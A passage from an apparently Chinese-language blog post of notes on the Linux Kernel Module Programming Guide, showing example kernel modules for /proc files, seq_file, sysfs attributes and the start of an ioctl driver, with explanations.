class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_MAX_SIZE 2048UL </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_ENTRY_FILENAME <span class="string">&quot;buffer2k&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">our_proc_file</span>;</span> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> procfs_buffer[PROCFS_MAX_SIZE]; </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> procfs_buffer_size = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">procfs_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                           <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span> (*offset || procfs_buffer_size == <span class="number">0</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;procfs_read: END\n&quot;</span>); </span><br><span class="line">        *offset = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    procfs_buffer_size = min(procfs_buffer_size, length); </span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buffer, procfs_buffer, procfs_buffer_size)) </span><br><span class="line">        <span class="keyword">return</span> -EFAULT; </span><br><span class="line">    *offset += procfs_buffer_size; </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;procfs_read: read %lu bytes\n&quot;</span>, procfs_buffer_size); </span><br><span class="line">    <span class="keyword">return</span> procfs_buffer_size; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">procfs_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                            <span class="type">size_t</span> len, <span class="type">loff_t</span> *off)</span> </span><br><span class="line">&#123; </span><br><span class="line">    procfs_buffer_size = min(PROCFS_MAX_SIZE, len); </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(procfs_buffer, buffer, procfs_buffer_size)) </span><br><span class="line">        <span class="keyword">return</span> -EFAULT; </span><br><span class="line">    *off += procfs_buffer_size; </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;procfs_write: write %lu bytes\n&quot;</span>, procfs_buffer_size); </span><br><span class="line">    <span class="keyword">return</span> procfs_buffer_size; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">procfs_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    try_module_get(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">procfs_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    module_put(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">file_ops_4_our_proc_file</span> =</span> &#123; </span><br><span class="line">    .proc_read = procfs_read, </span><br><span class="line">    .proc_write = procfs_write, </span><br><span class="line">    .proc_open = procfs_open, </span><br><span class="line">    .proc_release = procfs_close, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">file_ops_4_our_proc_file</span> =</span> &#123; </span><br><span class="line">    .read = procfs_read, </span><br><span class="line">    .write = procfs_write, </span><br><span class="line">    .open = procfs_open, </span><br><span class="line">    .release = procfs_close, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">procfs3_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    our_proc_file = proc_create(PROCFS_ENTRY_FILENAME, <span class="number">0644</span>, <span class="literal">NULL</span>, </span><br><span class="line">                                &amp;file_ops_4_our_proc_file); </span><br><span class="line">    <span class="keyword">if</span> (our_proc_file == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;Error: Could not initialize /proc/%s\n&quot;</span>, </span><br><span class="line">                 PROCFS_ENTRY_FILENAME); </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line">    &#125; </span><br><span class="line">    proc_set_size(our_proc_file, <span class="number">80</span>); </span><br><span class="line">    proc_set_user(our_proc_file, GLOBAL_ROOT_UID, GLOBAL_ROOT_GID); </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s created\n&quot;</span>, PROCFS_ENTRY_FILENAME); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">procfs3_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    remove_proc_entry(PROCFS_ENTRY_FILENAME, <span class="literal">NULL</span>); </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s removed\n&quot;</span>, PROCFS_ENTRY_FILENAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(procfs3_init); </span><br><span class="line">module_exit(procfs3_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/image-20240115143522039.png" class="" title="image-20240115143522039">

<h3 id="5-4-Manage-proc-file-with-seq-file"><a href="#5-4-Manage-proc-file-with-seq-file" class="headerlink" title="5.4 Manage &#x2F;proc file with seq_file"></a>5.4 Manage &#x2F;proc file with seq_file</h3><p>前面的构建&#x2F;proc文件过程比较复杂。因此为了更方便的写&#x2F;proc文件，提供了<code>seq_file</code>api用于格式化&#x2F;proc文件。<code>seq_file</code>根据时序分为三个函数: <code>start()</code>, <code>next()</code>, <code>stop()</code>。当用户读取&#x2F;proc文件时，<code>seq_file</code>会新建一个时序。</p>
<p>时序以<code>start()</code>为开始。如果返回值不为空，则继续调用<code>next()</code>函数。该函数为一个迭代器，可以遍历所有的数据。每次<code>next()</code>函数调用，都会调用<code>show()</code>函数。<code>show()</code>函数会在用户读取的缓冲区中写入数据值。当函数返回空值后结束循环。然后<code>stop()</code>函数被调用。<code>stop()</code>函数调用结束后，会继续调用<code>start()</code>函数，直到<code>start()</code>函数返回空值结束。</p>
<img src="/posts/79c0f484/lkmpg-for-ht1x-1705301053942-4.svg" class="" title="lkmpg-for-ht1x">

<p>注：<code>seq_file</code>为<code>proc_ops</code>提供了基本的函数，例如<code>seq_read</code>, <code>seq_lseek</code>等。但是没有写入的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * procfs4.c -  create a &quot;file&quot; in /proc </span></span><br><span class="line"><span class="comment"> * This program uses the seq_file library to manage the /proc file. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> <span class="comment">/* We are doing kernel work */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> <span class="comment">/* Specifically, a module */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span> <span class="comment">/* Necessary because we use proc fs */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seq_file.h&gt;</span> <span class="comment">/* for seq_file */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 6, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_NAME <span class="string">&quot;iter&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called at the beginning of a sequence. </span></span><br><span class="line"><span class="comment"> * ie, when: </span></span><br><span class="line"><span class="comment"> *   - the /proc file is read (first time) </span></span><br><span class="line"><span class="comment"> *   - after the function stop (end of sequence) </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">my_seq_start</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">loff_t</span> *pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> counter = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* beginning a new sequence? */</span> </span><br><span class="line">    <span class="keyword">if</span> (*pos == <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="comment">/* yes =&gt; return a non null value to begin the sequence */</span> </span><br><span class="line">        <span class="keyword">return</span> &amp;counter; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* no =&gt; it is the end of the sequence, return end to stop reading */</span> </span><br><span class="line">    *pos = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called after the beginning of a sequence. </span></span><br><span class="line"><span class="comment"> * It is called until the return is NULL (this ends the sequence). </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">my_seq_next</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *tmp_v = (<span class="type">unsigned</span> <span class="type">long</span> *)v; </span><br><span class="line">    (*tmp_v)++; </span><br><span class="line">    (*pos)++; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called at the end of a sequence. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_seq_stop</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* nothing to do, we use a static value in start() */</span> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called for each &quot;step&quot; of a sequence. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_seq_show</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">loff_t</span> *spos = (<span class="type">loff_t</span> *)v; </span><br><span class="line"> </span><br><span class="line">    seq_printf(s, <span class="string">&quot;%Ld\n&quot;</span>, *spos); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure gather &quot;function&quot; to manage the sequence */</span> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">my_seq_ops</span> =</span> &#123; </span><br><span class="line">    .start = my_seq_start, </span><br><span class="line">    .next = my_seq_next, </span><br><span class="line">    .stop = my_seq_stop, </span><br><span class="line">    .show = my_seq_show, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called when the /proc file is open. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> seq_open(file, &amp;my_seq_ops); </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure gather &quot;function&quot; that manage the /proc file */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">my_file_ops</span> =</span> &#123; </span><br><span class="line">    .proc_open = my_open, </span><br><span class="line">    .proc_read = seq_read, </span><br><span class="line">    .proc_lseek = seq_lseek, </span><br><span class="line">    .proc_release = seq_release, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_file_ops</span> =</span> &#123; </span><br><span class="line">    .open = my_open, </span><br><span class="line">    .read = seq_read, </span><br><span class="line">    .llseek = seq_lseek, </span><br><span class="line">    .release = seq_release, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">procfs4_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">entry</span>;</span> </span><br><span class="line"> </span><br><span class="line">    entry = proc_create(PROC_NAME, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;my_file_ops); </span><br><span class="line">    <span class="keyword">if</span> (entry == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;Error: Could not initialize /proc/%s\n&quot;</span>, PROC_NAME); </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">procfs4_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    remove_proc_entry(PROC_NAME, <span class="literal">NULL</span>); </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s removed\n&quot;</span>, PROC_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(procfs4_init); </span><br><span class="line">module_exit(procfs4_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Chapter-6-Interacting-with-your-module"><a href="#Chapter-6-Interacting-with-your-module" class="headerlink" title="Chapter 6 Interacting with your module"></a>Chapter 6 Interacting with your module</h2><p><code>sysfs</code>可以实现在用户空间通过在模块中读取或设置变量与运行的内核进行交互。查看系统的<code>sysfs</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /sys</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/image-20240115145741324.png" class="" title="image-20240115145741324">

<p>可以在文件系统中以常规文件的形式为kobjects导出属性。Sysfs将文件I&#x2F;O操作转发给为属性定义的方法，提供了提供了读写内核属性的方法。</p>
<p>一个属性的简单定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> &#123;</span> </span><br><span class="line">    <span class="type">char</span> *name; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span> </span><br><span class="line">    <span class="type">umode_t</span> mode; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">sysfs_create_file</span><span class="params">(<span class="keyword">struct</span> kobject * kobj, <span class="type">const</span> <span class="keyword">struct</span> attribute * attr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">sysfs_remove_file</span><span class="params">(<span class="keyword">struct</span> kobject * kobj, <span class="type">const</span> <span class="keyword">struct</span> attribute * attr)</span>;</span><br></pre></td></tr></table></figure>

<p>例如，设备驱动模型定义了<code>device_attribute</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device_attribute</span> &#123;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> <span class="title">attr</span>;</span> </span><br><span class="line">    <span class="type">ssize_t</span> (*show)(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> device_attribute *attr, </span><br><span class="line">                    <span class="type">char</span> *buf); </span><br><span class="line">    <span class="type">ssize_t</span> (*store)(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> device_attribute *attr, </span><br><span class="line">                    <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> count); </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">device_create_file</span><span class="params">(<span class="keyword">struct</span> device *, <span class="type">const</span> <span class="keyword">struct</span> device_attribute *)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">device_remove_file</span><span class="params">(<span class="keyword">struct</span> device *, <span class="type">const</span> <span class="keyword">struct</span> device_attribute *)</span>;</span><br></pre></td></tr></table></figure>

<p>为了读写attributes，show()和store()方法必须声明定义。一般情况下include&#x2F;linux&#x2F;sysfs.h提供了便捷的宏用来简化定义。</p>
<p>以下为一个hello world模块，通过sysfs实现了创建一个可以访问的变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * hello-sysfs.c sysfs example </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kobject.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sysfs.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">mymodule</span>;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* the variable you want to be able to change */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myvariable = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">myvariable_show</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, </span></span><br><span class="line"><span class="params">                               <span class="keyword">struct</span> kobj_attribute *attr, <span class="type">char</span> *buf)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d\n&quot;</span>, myvariable); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">myvariable_store</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, </span></span><br><span class="line"><span class="params">                                <span class="keyword">struct</span> kobj_attribute *attr, <span class="type">char</span> *buf, </span></span><br><span class="line"><span class="params">                                <span class="type">size_t</span> count)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%du&quot;</span>, &amp;myvariable); </span><br><span class="line">    <span class="keyword">return</span> count; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_attribute</span> <span class="title">myvariable_attribute</span> =</span> </span><br><span class="line">    __ATTR(myvariable, <span class="number">0660</span>, myvariable_show, (<span class="type">void</span> *)myvariable_store); </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mymodule_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> error = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;mymodule: initialised\n&quot;</span>); </span><br><span class="line"> </span><br><span class="line">    mymodule = kobject_create_and_add(<span class="string">&quot;mymodule&quot;</span>, kernel_kobj); </span><br><span class="line">    <span class="keyword">if</span> (!mymodule) </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line"> </span><br><span class="line">    error = sysfs_create_file(mymodule, &amp;myvariable_attribute.attr); </span><br><span class="line">    <span class="keyword">if</span> (error) &#123; </span><br><span class="line">        pr_info(<span class="string">&quot;failed to create the myvariable file &quot;</span> </span><br><span class="line">                <span class="string">&quot;in /sys/kernel/mymodule\n&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> error; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mymodule_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;mymodule: Exit success\n&quot;</span>); </span><br><span class="line">    kobject_put(mymodule); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(mymodule_init); </span><br><span class="line">module_exit(mymodule_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>效果图如下，成功实现对sys文件下模块的变量的读写。</p>
<img src="/posts/79c0f484/image-20240115150838900.png" class="" title="image-20240115150838900">

<p>以上情况下，使用了kobject来创建sysfs下的目录，并与其下的属性文件进行信息交互。<strong>kobject</strong>起初用于统一内核代码的简单方法，用于管理引用计数对象，目前时将设备驱动与sysfs接口联系在一起的粘合剂。</p>
<h2 id="Chapter-7-Talking-To-Device-Files"><a href="#Chapter-7-Talking-To-Device-Files" class="headerlink" title="Chapter 7. Talking To Device Files"></a>Chapter 7. Talking To Device Files</h2><h3 id="7-1-Talking-to-Device-Files-write-and-IOCTLS"><a href="#7-1-Talking-to-Device-Files-write-and-IOCTLS" class="headerlink" title="7.1 Talking to Device Files (write and IOCTLS)"></a>7.1 Talking to Device Files (write and IOCTLS)</h3><p>设备文件（&#x2F;dev目录包含了所有linux中使用的外部设备，但是不包含外部设备的驱动信息，外舍驱动在&#x2F;kernel&#x2F;drivers）代表了物理设备。大多数的设备既有输入也有输出，因此需要一些方法令内核中的设备驱动从进程中获取输出发送给设备，通过打开设备文件并写入实现。下面例子实现了device_write。</p>
<p>当然只有这些写入操作还不够，假设有场景需要串口与解调器通信，可以通过读写设备文件实现消息的接受与发送，<strong>但是应该如何与串口本身通信是一个问题</strong>，例如波特率等配置信息。</p>
<p>Unix系统提供了<code>ioctl（Input Output Control）</code>函数，每个设备都有自己的ioctl命令，可以读取（从进程发送信息到内核），写入（从内核返回信息到进程）等。</p>
<p><code>ioctl</code>函数有三个参数：合适的设备文件描述符，<code>ioctl</code>数，参数（long型）可以强制转换来传递任何内容。可以传递结构体指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * ioctl.c </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ioctl_arg</span> &#123;</span> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> val; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Documentation/userspace-api/ioctl/ioctl-number.rst */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOC_MAGIC <span class="string">&#x27;\x66&#x27;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALSET _IOW(IOC_MAGIC, 0, struct ioctl_arg) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALGET _IOR(IOC_MAGIC, 1, struct ioctl_arg) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALGET_NUM _IOR(IOC_MAGIC, 2, int) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VALSET_NUM _IOW(IOC_MAGIC, 3, int) </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VAL_MAXNR 3 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">&quot;ioctltest&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> test_ioctl_major = <span class="number">0</span>; </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> num_of_dev = <span class="number">1</span>; </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">test_ioctl_cdev</span>;</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ioctl_num = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> &#123;</span> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="type">rwlock_t</span> lock; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">test_ioctl_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, </span></span><br><span class="line"><span class="params">                             <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span> =</span> filp-&gt;private_data; </span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ioctl_arg</span> <span class="title">data</span>;</span> </span><br><span class="line">    <span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data)); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALSET: </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;data, (<span class="type">int</span> __user *)arg, <span class="keyword">sizeof</span>(data))) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> done; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        pr_alert(<span class="string">&quot;IOCTL set val:%x .\n&quot;</span>, data.val); </span><br><span class="line">        write_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        ioctl_data-&gt;val = data.val; </span><br><span class="line">        write_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALGET: </span><br><span class="line">        read_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        val = ioctl_data-&gt;val; </span><br><span class="line">        read_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        data.val = val; </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user((<span class="type">int</span> __user *)arg, &amp;data, <span class="keyword">sizeof</span>(data))) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> done; </span><br><span class="line">        &#125; </span><br><span 